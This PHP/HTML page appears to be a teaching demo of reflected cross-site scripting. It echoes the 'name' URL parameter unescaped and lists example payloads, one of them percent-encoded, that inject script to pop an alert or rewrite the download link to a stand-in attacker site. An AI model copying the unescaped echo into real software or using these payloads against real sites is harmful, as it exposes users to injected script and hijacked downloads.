<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>hello git</title>
    </head>
    <body>
        <?php
            if(isset($_GET['name'])) {
                $name = $_GET['name'];
                echo "Welcome $name<br>";
            }
            echo '<a href="http://www.facebook.com/">Click to Download</a>';
            echo '<br><br>add the bello value for the url to see how this works';
            echo '<h3>?name=guest&lt;script&gt;alert("attacked")&lt;/script&gt;<h3>';
            echo '?name=&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}&lt;/script&gt;';
            echo '<br><br>?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e';
        ?>
    </body>
</html>